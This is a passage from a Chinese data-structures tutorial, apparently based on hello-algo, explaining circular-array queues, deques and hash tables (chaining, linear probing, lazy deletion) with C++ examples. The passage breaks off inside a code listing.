start="2"><li>基于数组的实现：</li></ol><p>在数组中删除首元素的时间复杂度为$O(n)$，这会导致出队操作效率较低。然而，我们可以采用以下巧妙方法来避免这个问题。</p><p>我们可以使用一个变量 <code>front</code> 指向队首元素的索引，并维护一个变量 <code>size</code> 用于记录队列长度。定义 <code>rear = front + size</code> ，这个公式计算出的 <code>rear</code> 指向队尾元素之后的下一个位置。</p><p>基于此设计，**数组中包含元素的有效区间为 <code>[front, rear - 1]</code>**，各种操作的实现方法如图所示。</p><ul><li>入队操作：将输入元素赋值给 <code>rear</code> 索引处，并将 <code>size</code> 增加 1 。</li><li>出队操作：只需将 <code>front</code> 增加 1 ，并将 <code>size</code> 减少 1 。</li></ul><p>可以看到，入队和出队操作都只需进行一次操作，时间复杂度均为$O(1)$。</p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/queue.assets/array_queue_step1.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/queue.assets/array_queue_step2_push.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/queue.assets/array_queue_step3_pop.png" srcset="/img/loading.gif" lazyload></p><p>你可能会发现一个问题：在不断进行入队和出队的过程中，<code>front</code> 和 <code>rear</code> 都在向右移动，<strong>当它们到达数组尾部时就无法继续移动了</strong>。为了解决此问题，我们可以将数组视为首尾相接的“环形数组”。</p><p>对于环形数组，我们需要让 <code>front</code> 或 <code>rear</code> 在越过数组尾部时，直接回到数组头部继续遍历。这种周期性规律可以通过“取余操作”来实现，代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于环形数组实现的队列 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayQueue</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> *nums;       <span class="hljs-comment">// 用于存储队列元素的数组</span><br>    <span class="hljs-type">int</span> front;       <span class="hljs-comment">// 队首指针，指向队首元素</span><br>    <span class="hljs-type">int</span> queSize;     <span class="hljs-comment">// 队列长度</span><br>    <span class="hljs-type">int</span> queCapacity; <span class="hljs-comment">// 队列容量</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">ArrayQueue</span>(<span class="hljs-type">int</span> capacity) &#123;<br>        <span class="hljs-comment">// 初始化数组</span><br>        nums = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[capacity];<br>        queCapacity = capacity;<br>        front = queSize = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    ~<span class="hljs-built_in">ArrayQueue</span>() &#123;<br>        <span class="hljs-keyword">delete</span>[] nums;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取队列的容量 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">capacity</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queCapacity;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取队列的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queSize;<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断队列是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入队 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (queSize == queCapacity) &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;队列已满&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 计算队尾指针，指向队尾索引 + 1</span><br>        <span class="hljs-comment">// 通过取余操作实现 rear 越过数组尾部后回到头部</span><br>        <span class="hljs-type">int</span> rear = (front + queSize) % queCapacity;<br>        <span class="hljs-comment">// 将 num 添加至队尾</span><br>        nums[rear] = num;<br>        queSize++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 出队 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">peek</span>();<br>        <span class="hljs-comment">// 队首指针向后移动一位，若越过尾部，则返回到数组头部</span><br>        front = (front + <span class="hljs-number">1</span>) % queCapacity;<br>        queSize--;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问队首元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;队列为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> nums[front];<br>    &#125;<br><br>    <span class="hljs-comment">/* 将数组转化为 Vector 并返回 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 仅转换有效长度范围内的列表元素</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">arr</span><span class="hljs-params">(queSize)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = front; i &lt; queSize; i++, j++) &#123;<br>            arr[i] = nums[j % queCapacity];<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="双向队列"><a href="#双向队列" class="headerlink" title="双向队列"></a>双向队列</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化双向队列 */</span><br>deque&lt;<span class="hljs-type">int</span>&gt; deque;<br><br><span class="hljs-comment">/* 元素入队 */</span><br>deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span>);   <span class="hljs-comment">// 添加至队尾</span><br>deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<br>deque.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);<br>deque.<span class="hljs-built_in">push_front</span>(<span class="hljs-number">3</span>);  <span class="hljs-comment">// 添加至队首</span><br>deque.<span class="hljs-built_in">push_front</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* 访问元素 */</span><br><span class="hljs-type">int</span> front = deque.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">// 队首元素</span><br><span class="hljs-type">int</span> back = deque.<span class="hljs-built_in">back</span>();   <span class="hljs-comment">// 队尾元素</span><br><br><span class="hljs-comment">/* 元素出队 */</span><br>deque.<span class="hljs-built_in">pop_front</span>();  <span class="hljs-comment">// 队首元素出队</span><br>deque.<span class="hljs-built_in">pop_back</span>();   <span class="hljs-comment">// 队尾元素出队</span><br><br><span class="hljs-comment">/* 获取双向队列的长度 */</span><br><span class="hljs-type">int</span> size = deque.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断双向队列是否为空 */</span><br><span class="hljs-type">bool</span> empty = deque.<span class="hljs-built_in">empty</span>();<br></code></pre></td></tr></table></figure><h3 id="第6章-哈希表"><a href="#第6章-哈希表" class="headerlink" title="第6章 哈希表"></a>第6章 哈希表</h3><h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p>哈希表（hash table），又称散列表，它通过建立键 <code>key</code> 与值 <code>value</code> 之间的映射，实现高效的元素查询。具体而言，我们向哈希表中输入一个键 <code>key</code> ，则可以在$O(1)$时间内获取对应的值 <code>value</code> 。</p><table><thead><tr><th align="center"></th><th align="center">数组</th><th align="center">链表</th><th align="center">哈希表</th></tr></thead><tbody><tr><td align="center">查找元素</td><td align="center">$O(n)$</td><td align="center">$O(n)$</td><td align="center">$O(1)$</td></tr><tr><td align="center">添加元素</td><td align="center">$O(1)$</td><td align="center">$O(1)$</td><td align="center">$O(1)$</td></tr><tr><td align="center">删除元素</td><td align="center">$O(n)$</td><td align="center">$O(n)$</td><td align="center">$O(1)$</td></tr></tbody></table><h5 id="哈希表常用操作"><a href="#哈希表常用操作" class="headerlink" title="哈希表常用操作"></a>哈希表常用操作</h5><p>哈希表的常见操作包括：初始化、查询操作、添加键值对和删除键值对等，示例代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化哈希表 */</span><br>unordered_map&lt;<span class="hljs-type">int</span>, string&gt; map;<br><br><span class="hljs-comment">/* 添加操作 */</span><br><span class="hljs-comment">// 在哈希表中添加键值对 (key, value)</span><br>map[<span class="hljs-number">12836</span>] = <span class="hljs-string">&quot;小哈&quot;</span>;<br>map[<span class="hljs-number">15937</span>] = <span class="hljs-string">&quot;小啰&quot;</span>;<br>map[<span class="hljs-number">16750</span>] = <span class="hljs-string">&quot;小算&quot;</span>;<br>map[<span class="hljs-number">13276</span>] = <span class="hljs-string">&quot;小法&quot;</span>;<br>map[<span class="hljs-number">10583</span>] = <span class="hljs-string">&quot;小鸭&quot;</span>;<br><br><span class="hljs-comment">/* 查询操作 */</span><br><span class="hljs-comment">// 向哈希表中输入键 key ，得到值 value</span><br>string name = map[<span class="hljs-number">15937</span>];<br><br><span class="hljs-comment">/* 删除操作 */</span><br><span class="hljs-comment">// 在哈希表中删除键值对 (key, value)</span><br>map.<span class="hljs-built_in">erase</span>(<span class="hljs-number">10583</span>);<br></code></pre></td></tr></table></figure><p>哈希表有三种常用的遍历方式：遍历键值对、遍历键和遍历值。示例代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 遍历哈希表 */</span><br><span class="hljs-comment">// 遍历键值对 key-&gt;value</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> kv: map) &#123;<br>    cout &lt;&lt; kv.first &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; kv.second &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">// 使用迭代器遍历 key-&gt;value</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = map.<span class="hljs-built_in">begin</span>(); iter != map.<span class="hljs-built_in">end</span>(); iter++) &#123;<br>    cout &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot;-&gt;&quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="哈希表简单实现"><a href="#哈希表简单实现" class="headerlink" title="哈希表简单实现"></a>哈希表简单实现</h5><p>我们先考虑最简单的情况，<strong>仅用一个数组来实现哈希表</strong>。在哈希表中，我们将数组中的每个空位称为桶（bucket），每个桶可存储一个键值对。因此，查询操作就是找到 <code>key</code> 对应的桶，并在桶中获取 <code>value</code> 。</p><p>那么，如何基于 <code>key</code> 定位对应的桶呢？这是通过哈希函数（hash function）实现的。哈希函数的作用是将一个较大的输入空间映射到一个较小的输出空间。在哈希表中，输入空间是所有 <code>key</code> ，输出空间是所有桶（数组索引）。换句话说，输入一个 <code>key</code> ，<strong>我们可以通过哈希函数得到该 <code>key</code> 对应的键值对在数组中的存储位置</strong>。</p><p>输入一个 <code>key</code> ，哈希函数的计算过程分为以下两步。</p><ol><li>通过某种哈希算法 <code>hash()</code> 计算得到哈希值。</li><li>将哈希值对桶数量（数组长度）<code>capacity</code> 取模，从而获取该 <code>key</code> 对应的数组索引 <code>index</code> 。</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">index</span> <span class="hljs-operator">=</span> hash(key) % capacity<br></code></pre></td></tr></table></figure><p>随后，我们就可以利用 <code>index</code> 在哈希表中访问对应的桶，从而获取 <code>value</code> 。</p><p>以下代码实现了一个简单哈希表。其中，我们将 <code>key</code> 和 <code>value</code> 封装成一个类 <code>Pair</code> ，以表示键值对。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 键值对 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Pair</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> key;<br>    string val;<br>    <span class="hljs-built_in">Pair</span>(<span class="hljs-type">int</span> key, string val) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;key = key;<br>        <span class="hljs-keyword">this</span>-&gt;val = val;<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/* 基于数组实现的哈希表 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayHashMap</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    vector&lt;Pair *&gt; buckets;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">ArrayHashMap</span>() &#123;<br>        <span class="hljs-comment">// 初始化数组，包含 100 个桶</span><br>        buckets = <span class="hljs-built_in">vector</span>&lt;Pair *&gt;(<span class="hljs-number">100</span>);<br>    &#125;<br><br>    ~<span class="hljs-built_in">ArrayHashMap</span>() &#123;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;bucket : buckets) &#123;<br>            <span class="hljs-keyword">delete</span> bucket;<br>        &#125;<br>        buckets.<span class="hljs-built_in">clear</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 哈希函数 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">hashFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = key % <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br><br>    <span class="hljs-comment">/* 查询操作 */</span><br>    <span class="hljs-function">string <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        Pair *pair = buckets[index];<br>        <span class="hljs-keyword">if</span> (pair == <span class="hljs-literal">nullptr</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> pair-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-type">int</span> key, string val)</span> </span>&#123;<br>        Pair *pair = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Pair</span>(key, val);<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        buckets[index] = pair;<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除操作 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-built_in">hashFunc</span>(key);<br>        <span class="hljs-comment">// 释放内存并置为 nullptr</span><br>        <span class="hljs-keyword">delete</span> buckets[index];<br>        buckets[index] = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有键值对 */</span><br>    <span class="hljs-function">vector&lt;Pair *&gt; <span class="hljs-title">pairSet</span><span class="hljs-params">()</span> </span>&#123;<br>        vector&lt;Pair *&gt; pairSet;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span>) &#123;<br>                pairSet.<span class="hljs-built_in">push_back</span>(pair);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> pairSet;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有键 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">keySet</span><span class="hljs-params">()</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; keySet;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span>) &#123;<br>                keySet.<span class="hljs-built_in">push_back</span>(pair-&gt;key);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> keySet;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取所有值 */</span><br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">valueSet</span><span class="hljs-params">()</span> </span>&#123;<br>        vector&lt;string&gt; valueSet;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span>) &#123;<br>                valueSet.<span class="hljs-built_in">push_back</span>(pair-&gt;val);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> valueSet;<br>    &#125;<br><br>    <span class="hljs-comment">/* 打印哈希表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (Pair *kv : <span class="hljs-built_in">pairSet</span>()) &#123;<br>            cout &lt;&lt; kv-&gt;key &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; kv-&gt;val &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="哈希冲突"><a href="#哈希冲突" class="headerlink" title="哈希冲突"></a>哈希冲突</h4><p>哈希冲突会导致查询结果错误，严重影响哈希表的可用性。为了解决该问题，每当遇到哈希冲突时，我们就进行哈希表扩容，直至冲突消失为止。此方法简单粗暴且有效，但效率太低，因为哈希表扩容需要进行大量的数据搬运与哈希值计算。为了提升效率，我们可以采用以下策略。</p><ol><li>改良哈希表数据结构，使得哈希表可以在出现哈希冲突时正常工作。</li><li>仅在必要时，即当哈希冲突比较严重时，才执行扩容操作。</li></ol><p>哈希表的结构改良方法主要包括“链式地址”和“开放寻址”。</p><h5 id="链式地址"><a href="#链式地址" class="headerlink" title="链式地址"></a>链式地址</h5><p>在原始哈希表中，每个桶仅能存储一个键值对。链式地址（separate chaining）将单个元素转换为链表，将键值对作为链表节点，将所有发生冲突的键值对都存储在同一链表中。下图展示了一个链式地址哈希表的例子。</p><p><img src="https://www.hello-algo.com/chapter_hashing/hash_collision.assets/hash_table_chaining.png" srcset="/img/loading.gif" lazyload></p><p>基于链式地址实现的哈希表的操作方法发生了以下变化：</p><ul><li><strong>查询元素</strong>：输入 <code>key</code> ，经过哈希函数得到桶索引，即可访问链表头节点，然后遍历链表并对比 <code>key</code> 以查找目标键值对。</li><li><strong>添加元素</strong>：首先通过哈希函数访问链表头节点，然后将节点（键值对）添加到链表中。</li><li><strong>删除元素</strong>：根据哈希函数的结果访问链表头部，接着遍历链表以查找目标节点并将其删除。</li></ul><p>链式地址存在以下局限性。</p><ul><li><strong>占用空间增大</strong>：链表包含节点指针，它相比数组更加耗费内存空间。</li><li><strong>查询效率降低</strong>：因为需要线性遍历链表来查找对应元素。</li></ul><p>值得注意的是，当链表很长时，查询效率$O(n)$很差。<strong>此时可以将链表转换为“AVL 树”或“红黑树”</strong>，从而将查询操作的时间复杂度优化至$O(logn)$。</p><h5 id="开放寻址"><a href="#开放寻址" class="headerlink" title="开放寻址"></a>开放寻址</h5><p>开放寻址（open addressing）不引入额外的数据结构，而是通过“多次探测”来处理哈希冲突，探测方式主要包括线性探测、平方探测和多次哈希等。</p><ol><li>线性寻址：</li></ol><p>线性探测采用固定步长的线性搜索来进行探测，其操作方法与普通哈希表有所不同。</p><ul><li><strong>插入元素</strong>：通过哈希函数计算桶索引，若发现桶内已有元素，则从冲突位置向后线性遍历（步长通常为1），直至找到空桶，将元素插入其中。</li><li><strong>查找元素</strong>：若发现哈希冲突，则使用相同步长向后进行线性遍历，直到找到对应元素，返回 <code>value</code> 即可；如果遇到空桶，说明目标元素不在哈希表中，返回 <code>None</code> 。</li></ul><p>然而，<strong>线性探测容易产生“聚集现象”</strong>。具体来说，数组中连续被占用的位置越长，这些连续位置发生哈希冲突的可能性越大，从而进一步促使该位置的聚堆生长，形成恶性循环，最终导致增删查改操作效率劣化。</p><p>值得注意的是，<strong>我们不能在开放寻址哈希表中直接删除元素</strong>。这是因为删除元素会在数组内产生一个空桶 <code>None</code> ，而当查询元素时，线性探测到该空桶就会返回，因此在该空桶之下的元素都无法再被访问到，程序可能误判这些元素不存在，如下图所示：</p><p><img src="https://www.hello-algo.com/chapter_hashing/hash_collision.assets/hash_table_open_addressing_deletion.png" srcset="/img/loading.gif" lazyload></p><p>为了解决该问题，我们可以采用懒删除（lazy deletion）机制：它不直接从哈希表中移除元素，<strong>而是利用一个常量 <code>TOMBSTONE</code> 来标记这个桶</strong>。在该机制下，<code>None</code> 和 <code>TOMBSTONE</code> 都代表空桶，都可以放置键值对。但不同的是，线性探测到 <code>TOMBSTONE</code> 时应该继续遍历，因为其之下可能还存在键值对。</p><p>然而，<strong>懒删除可能会加速哈希表的性能退化</strong>。这是因为每次删除操作都会产生一个删除标记，随着 <code>TOMBSTONE</code> 的增加，搜索时间也会增加，因为线性探测可能需要跳过多个 <code>TOMBSTONE</code> 才能找到目标元素。</p><p>为此，考虑在线性探测中记录遇到的首个 <code>TOMBSTONE</code> 的索引，并将搜索到的目标元素与该 <code>TOMBSTONE</code> 交换位置。这样做的好处是当每次查询或添加元素时，元素会被移动至距离理想位置（探测起始点）更近的桶，从而优化查询效率。</p><p>以下代码实现了一个包含懒删除的开放寻址（线性探测）哈希表。为了更加充分地使用哈希表的空间，我们将哈希表看作一个“环形数组”，当越过数组尾部时，回到头部继续遍历。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 